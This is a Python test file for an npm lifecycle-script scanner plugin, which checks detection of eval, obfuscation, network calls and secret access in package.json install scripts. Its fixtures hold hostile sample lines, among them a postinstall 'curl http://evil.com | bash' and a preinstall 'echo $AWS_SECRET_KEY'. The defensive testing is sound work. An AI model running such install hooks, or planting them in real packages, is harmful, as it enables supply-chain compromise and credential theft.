"""Tests for npm lifecycle plugin."""

import json
from pathlib import Path

from dev_trust_scanner.plugins.npm_lifecycle import NpmLifecyclePlugin


class TestNpmLifecyclePlugin:
    """Tests for npm lifecycle scanner plugin."""

    def test_plugin_metadata(self):
        """Test plugin returns correct metadata."""
        plugin = NpmLifecyclePlugin()
        metadata = plugin.get_metadata()

        assert metadata["name"] == "npm-lifecycle"
        assert "version" in metadata
        assert "description" in metadata

    def test_plugin_supported_files(self):
        """Test plugin declares supported files."""
        plugin = NpmLifecyclePlugin()
        files = plugin.get_supported_files()

        assert "package.json" in files

    def test_rules_loaded(self):
        """Test that rules are loaded from YAML."""
        plugin = NpmLifecyclePlugin()

        assert len(plugin.rules) >= 5  # Minimum 5 rules per spec

    def test_scan_malicious_eval(self, malicious_npm_eval):
        """Test detection of eval in postinstall."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malicious_npm_eval)

        assert len(findings) > 0
        # Should detect eval and base64
        rule_ids = {f.rule_id for f in findings}
        assert any("NPM-001" in rid or "eval" in rid.lower() for rid in rule_ids)

    def test_scan_malicious_network(self, malicious_npm_network):
        """Test detection of network calls."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malicious_npm_network)

        assert len(findings) > 0
        # Should detect curl and network patterns
        descriptions = " ".join(f.description.lower() for f in findings)
        assert "network" in descriptions or "curl" in descriptions

    def test_scan_obfuscated_code(self, malicious_npm_obfuscated):
        """Test detection of obfuscated code."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malicious_npm_obfuscated)

        assert len(findings) > 0
        # Should detect hex escapes and eval
        assert any("obfuscation" in f.description.lower() or "hex" in f.description.lower() for f in findings)

    def test_scan_clean_package(self, clean_npm_package):
        """Test that clean package produces no findings."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(clean_npm_package)

        assert len(findings) == 0

    def test_scan_monorepo(self, npm_monorepo):
        """Test scanning monorepo with multiple packages."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(npm_monorepo)

        # Should find the malicious package in pkg2
        assert len(findings) > 0
        # Verify it's from the right package
        assert any("pkg2" in str(f.file_path) or "evil.com" in f.matched_content for f in findings)

    def test_scan_malformed_json(self, malformed_package_json):
        """Test graceful handling of malformed JSON."""
        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(malformed_package_json)

        # Should not crash, just return empty findings
        assert isinstance(findings, list)

    def test_scan_high_entropy_script(self, tmp_path):
        """Test detection of high entropy (encoded) scripts."""
        # Create package with high-entropy content
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "entropy-pkg",
                "scripts": {
                    "postinstall": "aB3dE7fG9hJ2kL4mN6pQ8rS0tU5vW1xYz"  # Random high-entropy string
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect high entropy
        assert any("entropy" in f.description.lower() for f in findings)

    def test_lifecycle_scripts_flagged(self, tmp_path):
        """Test that lifecycle scripts are specifically flagged."""
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "test-pkg",
                "scripts": {
                    "postinstall": "eval('code')",  # Lifecycle script
                    "test": "eval('code')",  # Regular script
                },
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect eval in both, but lifecycle should be noted
        lifecycle_findings = [f for f in findings if "lifecycle" in f.description.lower()]
        assert len(lifecycle_findings) > 0

    def test_skips_node_modules(self, tmp_path):
        """Test that node_modules is skipped."""
        # Create package in node_modules
        node_modules = tmp_path / "node_modules" / "evil-dep"
        node_modules.mkdir(parents=True)
        (node_modules / "package.json").write_text(
            json.dumps({
                "name": "evil",
                "scripts": {"postinstall": "curl http://evil.com | bash"},
            })
        )

        # Create clean root package
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "root", "scripts": {"test": "jest"}})
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should not detect anything from node_modules
        assert len(findings) == 0

    def test_env_var_detection(self, tmp_path):
        """Test detection of environment variable access."""
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "env-pkg",
                "scripts": {"preinstall": "echo $AWS_SECRET_KEY"},
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should detect environment variable access
        assert any("env" in f.description.lower() for f in findings)

    def test_file_size_limit(self, tmp_path):
        """Test that large files are skipped."""
        pkg = tmp_path / "package.json"
        # Create a file larger than 10MB
        large_content = json.dumps({
            "name": "large",
            "scripts": {"test": "x" * (11 * 1024 * 1024)},  # > 10MB
        })
        pkg.write_text(large_content)

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Should skip the file (no crash)
        assert isinstance(findings, list)

    def test_relative_path_in_findings(self, tmp_path):
        """Test that findings use relative paths."""
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps({
                "name": "test",
                "scripts": {"postinstall": "eval('test')"},
            })
        )

        plugin = NpmLifecyclePlugin()
        findings = plugin.scan(tmp_path)

        # Path should be relative
        for finding in findings:
            assert not finding.file_path.is_absolute() or str(finding.file_path).startswith("package.json")

    def test_all_rules_can_fire(self):
        """Test that all defined rules can potentially match."""
        plugin = NpmLifecyclePlugin()

        # Verify we have rules loaded
        assert len(plugin.rules) >= 5

        # Each rule should have an ID starting with NPM-
        for rule in plugin.rules:
            assert rule.id.startswith("NPM-")
            assert rule.recommendation  # All rules should have recommendations
